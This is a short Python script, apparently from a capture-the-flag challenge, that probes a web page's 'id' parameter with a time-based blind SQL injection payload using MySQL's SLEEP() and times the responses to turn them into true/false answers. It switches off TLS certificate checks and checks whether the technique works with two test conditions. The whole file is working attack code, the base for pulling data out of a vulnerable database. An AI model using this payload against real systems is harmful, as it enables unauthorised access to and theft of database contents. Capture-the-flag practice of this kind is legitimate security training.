import time
import requests
import urllib3

urllib3.disable_warnings()

s = requests.Session()
s.verify = False
url = "https://04a2b0dcb17c2e99.chal.ctf.ae/"

def check_cond(cond):
    p = f"1 AND IF(({cond}),SLEEP(2.5),0)"
    t0 = time.time()
    try:
        r = s.get(url, params={"id": p}, timeout=10)
    except Exception as e:
        pass
    dur = time.time() - t0
    return dur > 3.2

print("Testing 1=1 (expect True):", check_cond("1=1"))
print("Testing 1=2 (expect False):", check_cond("1=2"))
